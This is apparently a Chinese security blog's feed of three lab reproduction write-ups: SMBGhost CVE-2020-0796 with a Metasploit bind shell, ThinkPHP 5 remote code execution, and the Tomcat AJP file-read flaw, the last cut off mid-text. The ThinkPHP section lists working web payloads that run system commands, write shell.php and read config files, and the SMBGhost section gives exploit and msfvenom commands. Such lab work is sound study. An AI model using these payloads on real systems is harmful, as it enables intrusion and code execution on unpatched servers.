<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chaceshadow&#39;s Blog</title>
  
  <subtitle>神无月</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-06-09T13:45:56.214Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Ch4ce</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2020-0796 SMBv3 RCE漏洞检测+复现</title>
    <link href="http://yoursite.com/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-06-09T12:11:00.000Z</published>
    <updated>2020-06-09T13:45:56.214Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><blockquote><p>2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Disabling SMBv3 Compression）,公告表示在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，恶意伪造的压缩数据包 时出现的错误引发的，从而造成SMB服务器的缓冲区溢出,攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码。</p></blockquote><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><blockquote><p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。</p></blockquote><a id="more"></a><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote><p>漏洞存在于在srv2.sys驱动中，由于SMB没有正确处理压缩的数据包，在解压数据包的时候调用函数Srv2DecompressData处理压缩数据时候，对压缩数据头部压缩数据大小OriginalCompressedSegmentSize和其偏移Offset的没有检查其是否合法，导致其相加可分配较小的内存，后面调用SmbCompressionDecompress进行数据处理时候使用这片较小的内存可导致拷贝溢出或越界访问，而在执行本地程序的时候，可通过获取当前本地程序的token+0x40的偏移地址，通过发送压缩数据给SMB服务器，之后此偏移地址在解压缩数据时候拷贝的内核内存中，通过精心构造的内存布局在内核中修改token将权限提升。</p></blockquote><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>漏洞不影响 win7，漏洞影响 Windows 10 1903 之后的各个 32 位、64 位版 Windows，包括家用版、专业版、企业版、教育版。</p><blockquote><p>Windows 10 Version 1903 for 32-bit<br>Windows 10 Version 1903 for x64<br>Windows 10 Version 1903 for arm64<br>Windows 10 Version 1909 for 32-bit<br>Windows 10 Version 1909 for x64<br>Windows 10 Version 1909 for arm64<br>Windows Server 10 Version 1903 for server core installation<br>Windows Server 10 Version 1909 for server core installation</p></blockquote><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><dl><dt>攻击机：Kali Linux</dt><dd>IP：192.168.219.135<br>可以 ping 通 win10 虚拟机</dd></dl><dl><dt>靶 机：Windows 10 虚拟机 1909 x64 (专业版）</dt><dd>IP：192.168.219.142<br>关闭防火墙和 defender<br>1903 或者 1909 版本均可，我这里用的是1909版本</dd></dl><p>宿主机：Windows 7</p><h3 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h3><p>首先确认系统版本符合要求<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/1.png" alt><br>使用systeminfo确定下主机有没有打过这个补丁KB4551762<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/2.png" alt><br>关闭防火墙和 defender<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/3.png" alt></p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="git脚本检测"><a href="#git脚本检测" class="headerlink" title="git脚本检测"></a>git脚本检测</h3><blockquote><p><a href="https://github.com/ollypwn/SMBGhost" target="_blank" rel="noopener">https://github.com/ollypwn/SMBGhost</a></p></blockquote><p>检测返回的数据包中SMB压缩版本，这种检测方式打过补丁依然会误报。<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/4.png" alt><br><em>PS:脚本适用python3，宿主机电脑中只有python2，稍微修改一下print即可</em></p><h3 id="奇信安检测工具"><a href="#奇信安检测工具" class="headerlink" title="奇信安检测工具"></a>奇信安检测工具</h3><blockquote><p><a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip" target="_blank" rel="noopener">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p></blockquote><p>适用于局域网批量检测，快速查找未打补丁的机器。<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/5.png" alt></p><h3 id="腾讯电脑管家SMB漏洞修复工具"><a href="#腾讯电脑管家SMB漏洞修复工具" class="headerlink" title="腾讯电脑管家SMB漏洞修复工具"></a>腾讯电脑管家SMB漏洞修复工具</h3><blockquote><p><a href="http://dlied6.qq.com/invc/QQPatch/QuickFix_SMB0796.exe" target="_blank" rel="noopener">http://dlied6.qq.com/invc/QQPatch/QuickFix_SMB0796.exe</a></p></blockquote><p>适用于个人用户检测，一键快速检测和修复。<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/6.png" alt></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="蓝屏演示"><a href="#蓝屏演示" class="headerlink" title="蓝屏演示"></a>蓝屏演示</h3><p>蓝屏攻击POC:</p><blockquote><p><a href="https://github.com/eerykitty/CVE-2020-0796-PoC" target="_blank" rel="noopener">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;eerykitty&#x2F;CVE-2020-0796-PoC.git</span><br><span class="line">python3 setup.py install</span><br><span class="line">python3 CVE-2020-0796.py 192.168.219.142</span><br></pre></td></tr></table></figure><p>安装脚本和依赖库<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/7.png" alt><br>依赖库安装成功后执行蓝屏攻击脚本<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/8.png" alt><br>攻击成功结果如下<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/9.png" alt></p><h3 id="提权演示"><a href="#提权演示" class="headerlink" title="提权演示"></a>提权演示</h3><p>本地提权POC:</p><blockquote><p><a href="https://github.com/danigargu/CVE-2020-0796" target="_blank" rel="noopener">https://github.com/danigargu/CVE-2020-0796</a></p></blockquote><p>文件编译结果执行文件有两个，一个动态的，一个静态的，动态的需要另外安装相关dll文件，我们直接执行静态提权程序，成功弹出更高的system权限命令执行窗口</p><p><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/10.png" alt></p><h3 id="RCE演示"><a href="#RCE演示" class="headerlink" title="RCE演示"></a>RCE演示</h3><p>远程利用POC:</p><blockquote><p><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC" target="_blank" rel="noopener">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p></blockquote><ul><li>Kali下载POC</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;cve# git clone https:&#x2F;&#x2F;github.com&#x2F;chompie1337&#x2F;SMBGhost_RCE_PoC</span><br><span class="line">root@kali:~&#x2F;cve# cd SMBGhost_RCE_PoC</span><br><span class="line">root@kali:~&#x2F;cve&#x2F;SMBGhost_RCE_PoC# ls</span><br></pre></td></tr></table></figure><p><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/11.png" alt><br><em>PS：该POC需要用python3环境执行</em></p><ul><li>使用msfvenom生成payload，生成TXT文件便于后面修改</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;cve&#x2F;SMBGhost_RCE_PoC# msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp lport&#x3D;1234 -f py -o 1.txt</span><br></pre></td></tr></table></figure><p><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/12.png" alt></p><ul><li>将1.txt 生成的code中参数buf改为USER_PAYLOAD，然后替换到exploit.py中的USER_PAYLOAD参数。（顺序不要颠倒，否则执行会失败的，因为你在py全文替换buf的话，不小心会把代码中的全部的buf替换的）</li></ul><p><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/13.png" alt><br>这里不要忘记字符串前面的二进制格式换<code>b&quot;&quot;</code>不然脚本执行错误<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/14.png" alt></p><ul><li>新建一个终端，启动msf监听本地端口</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfconsole</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 1234</span><br><span class="line">lport &#x3D;&gt; 1234</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set rhost 192.168.219.142</span><br><span class="line">rhost &#x3D;&gt; 192.168.219.142</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/15.png" alt></p><ul><li>运行exploit.py</li></ul><p><code>python3 exploit.py -ip 192.168.219.142</code><br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/16.png" alt></p><p>一开始没反应，试了好几次，最后成功反弹shell（大家尝试的时候多试几次，看网上其他大佬说很容易蓝屏，蓝屏没有遇到，只是前几次每次执行后没反应，然后发现win10卡死了，ping不通，重启靶机即可）<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/17.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/xiaozi/p/13062533.html" target="_blank" rel="noopener">CVE-2020-0796 检测及利用工具</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Disabling SMBv3 Compression）,公告表示在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，恶意伪造的压缩数据包 时出现的错误引发的，从而造成SMB服务器的缓冲区溢出,攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="CVE-2020-0796" scheme="http://yoursite.com/tags/CVE-2020-0796/"/>
    
      <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
      <category term="SMB" scheme="http://yoursite.com/tags/SMB/"/>
    
      <category term="POC" scheme="http://yoursite.com/tags/POC/"/>
    
      <category term="漏洞检测" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 5 代码执行漏洞复现+POC</title>
    <link href="http://yoursite.com/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/"/>
    <id>http://yoursite.com/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/</id>
    <published>2020-06-09T12:07:00.000Z</published>
    <updated>2020-06-09T13:38:47.899Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ThinkPHP-5-0-10-环境框架搭建"><a href="#ThinkPHP-5-0-10-环境框架搭建" class="headerlink" title="ThinkPHP 5.0.10 环境框架搭建"></a>ThinkPHP 5.0.10 环境框架搭建</h2><p>ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企业应用开发而诞生的。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。</p><a id="more"></a><p><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/1.png" alt><br>查看当前版本<br><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/2.png" alt><br>环境搭建成功</p><h2 id="缓存类导致RCE"><a href="#缓存类导致RCE" class="headerlink" title="缓存类导致RCE"></a>缓存类导致RCE</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><blockquote><p>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</p></blockquote><h3 id="测试payload"><a href="#测试payload" class="headerlink" title="测试payload"></a>测试payload</h3><p><strong>漏洞利用条件</strong></p><ol><li>基于tp5开发的代码中使用了Cache::set 进行缓存</li><li>在利用版本范围内</li><li>runtime目录可以访问</li></ol><p>创建一个生成缓存的页面<br><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/3.png" alt><br>构造payload如下：</p><blockquote><p><a href="http://127.0.0.1/public/?username=syst1m%0d%0a@eval($_GET[_]);//" target="_blank" rel="noopener">http://127.0.0.1/public/?username=syst1m%0d%0a@eval($_GET[_]);//</a></p></blockquote><p>成功在缓存文件写入payload</p><p><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/4.png" alt></p><blockquote><p><a href="http://127.0.0.1/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php?_=phpinfo()" target="_blank" rel="noopener">http://127.0.0.1/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php?_=phpinfo()</a>;</p></blockquote><p><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/5.png" alt></p><p>成功执行代码</p><h2 id="未开启强制路由导致rce"><a href="#未开启强制路由导致rce" class="headerlink" title="未开启强制路由导致rce"></a>未开启强制路由导致rce</h2><h3 id="版本-1"><a href="#版本-1" class="headerlink" title="版本"></a>版本</h3><blockquote><p>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</p></blockquote><h3 id="测试payload-1"><a href="#测试payload-1" class="headerlink" title="测试payload"></a>测试payload</h3><blockquote><p>5.1.x ：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd</span><br><span class="line">?s=index/\think\view\driver\Php/display&amp;content=<span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line">?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure><blockquote><p>5.0.x ：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\config/get&amp;name=database.username # 获取配置信息</span><br><span class="line">?s=index/\think\Lang/load&amp;file=../../test.jpg    # 包含任意文件</span><br><span class="line">?s=index/\think\Config/load&amp;file=../../t.php     # 包含任意.php文件</span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure><p>当前环境版本是5.0.10，构造payload如下：</p><blockquote><p><a href="http://127.0.0.1/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami" target="_blank" rel="noopener">http://127.0.0.1/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</a></p></blockquote><p><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/6.png" alt><br>成功执行代码</p><h2 id="method任意调用方法导致rce"><a href="#method任意调用方法导致rce" class="headerlink" title="method任意调用方法导致rce"></a>method任意调用方法导致rce</h2><h3 id="版本-2"><a href="#版本-2" class="headerlink" title="版本"></a>版本</h3><blockquote><p>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</p></blockquote><h3 id="测试payload-2"><a href="#测试payload-2" class="headerlink" title="测试payload"></a>测试payload</h3><p>构造payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php?s&#x3D;index HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;whoami</span><br></pre></td></tr></table></figure><p><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/7.png" alt><br>成功执行代码</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/7792#toc-0" target="_blank" rel="noopener">Thinkphp5 RCE总结</a><br><a href="https://y4er.com/post/thinkphp5-rce" target="_blank" rel="noopener">Thinkphp5 代码执行学习</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ThinkPHP-5-0-10-环境框架搭建&quot;&gt;&lt;a href=&quot;#ThinkPHP-5-0-10-环境框架搭建&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP 5.0.10 环境框架搭建&quot;&gt;&lt;/a&gt;ThinkPHP 5.0.10 环境框架搭建&lt;/h2&gt;&lt;p&gt;ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企业应用开发而诞生的。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="ThinkPHP 5" scheme="http://yoursite.com/tags/ThinkPHP-5/"/>
    
      <category term="ThinkPHP" scheme="http://yoursite.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat文件包含漏洞的搭建与复现：CVE-2020-1938</title>
    <link href="http://yoursite.com/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/"/>
    <id>http://yoursite.com/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/</id>
    <published>2020-06-03T09:44:51.000Z</published>
    <updated>2020-06-03T11:04:02.366Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2020年2月20日，国家信息安全漏洞共享平台（CNVD）发布了Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp目录下的任意文件,如：webapp 配置文件或源代码等。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。目前，厂商已发布新版本完成漏洞修复。</p><p>Apache Tomcat都是Apache开源组织开发的用于处理HTTP服务的免费项目，可以作为独立的Web服务器运行。Tomcat是Apache软件基金会中的一个重要项目，性能稳定且免费，是目前较为流行的Web应用服务器。由于Tomcat应用范围较广，所以本次通告的漏洞影响范围较大，请相关用户及时采取防护措施或者升级补丁修复此漏洞。</p><a id="more"></a><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><h3 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h3><ul><li>Apache Tomcat 6</li><li>Apache Tomcat 7 &lt; 7.0.100</li><li>Apache Tomcat 8 &lt; 8.5.51</li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><h3 id="不受影响版本"><a href="#不受影响版本" class="headerlink" title="不受影响版本"></a>不受影响版本</h3><ul><li>Apache Tomcat = 7.0.100</li><li>Apache Tomcat = 8.5.51</li><li>Apache Tomcat = 9.0.31</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h3><ul><li><a href="http://tomcat.apache.org/download-80.cgi" target="_blank" rel="noopener">Apache Tomcat 8.0.39</a></li><li><a href="https://github.com/hypn0s/AJPy" target="_blank" rel="noopener">AJPy-master</a></li><li><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">CNVD-2020-10487-Tomcat-Ajp-lfi-master</a></li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先成功搭建tomcat环境：<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/1.png" alt="1"><br>本次漏洞利用的是AJP协议，该协议工作在8009端口，查看本机已开启：<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/2.png" alt="2"><br>使用<a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">CNVD-2020-10487-Tomcat-Ajp-lfi-master</a>的poc利用成功读取<code>WEB-INF/web.xml</code>文件：<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/3.png" alt="3"><br>该POC读取目录为ROOT，其他目录不行：<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/4.png" alt="4"><br>我们在目录下新建一个test.txt的文档，使用poc成功读取<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/5.png" alt="5"><br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/6.png" alt="6"><br>上面脚本只支持python2，我们使用<a href="https://github.com/hypn0s/AJPy" target="_blank" rel="noopener">AJPy-master</a>的poc同样成功，这个脚本还能对tomcat进行暴力破解，文件上传等<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/7.png" alt="7"><br>可以修改–webapp=manager来指定查看webapp目录下的子目录中文件<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/8.png" alt="8"></p><h2 id="漏洞防护"><a 